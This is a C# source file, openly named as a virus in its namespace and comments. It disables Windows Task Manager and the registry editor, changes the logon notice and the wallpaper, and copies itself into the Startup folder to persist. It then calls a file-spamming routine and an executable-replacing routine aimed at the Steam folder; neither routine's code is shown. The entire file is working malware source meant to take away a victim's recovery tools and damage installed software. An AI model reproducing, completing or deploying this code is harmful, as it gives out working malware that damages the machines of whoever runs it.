using System;
using Microsoft.Win32;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Virus
{
    class Program
    {
        static void Main(string[] args)
        {
            //string whatIsThis = "This program is a virus made by _k33m!";
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string workDir = Environment.CurrentDirectory + "\\";
            string exeName = AppDomain.CurrentDomain.FriendlyName;

            //Disables task manager
            try
            {
                RegistryKey myKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                myKey3.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                myKey3.Close();

                //MessageBox.Show("What task manager? xD", "Task Manager?");
            }
            catch (Exception)
            {

            }

            //Disables regedit
            try
            {
                RegistryKey myKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                myKey5.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                myKey5.Close();

               // MessageBox.Show("You can no longer edit the registry.", "Registry");
            }
            catch (Exception)
            {

            }

            //Changes startup welcome
             try
             {
                 RegistryKey myKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                 myKey.SetValue("legalnoticecaption", "it aint me", RegistryValueKind.String);
                 myKey.Close();

                 RegistryKey myKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                 myKey2.SetValue("legalnoticetext", "ALEX IS DOING THIS!", RegistryValueKind.String);
                 myKey2.Close();
             }
             catch (Exception)
             {

             }

            //Changes background
            try
            {
            Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("Virus.keem.jpg");
            Stream output = File.OpenWrite(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\keem.jpg");
            resource.CopyTo(output);

            RegistryKey myKey4 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            myKey4.SetValue("Wallpaper", userProfile + @"\keem.jpg", RegistryValueKind.String);
            myKey4.Close();
            }
            catch
            {

            }

            //Puts keem.wav on the users desktop
            try
            {
            Stream resource2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("Virus.keem.wav");
            Stream output2 = File.OpenWrite(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\keem.wav");
            resource2.CopyTo(output2);
            }
            catch
            {
            }

            string keemExe = workDir + exeName;
            try
            {
                File.Copy(keemExe, @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" + exeName);
            }
            catch
            {

            }



            fileSpammer fileSpam = new fileSpammer();
            fileSpammer.fileSpam();

            string sys32 = @"C:\Program Files (x86)\Steam";
            exeReplacer exe = new exeReplacer();
            exeReplacer.ProcessDirectory(sys32);
        }

    }
}
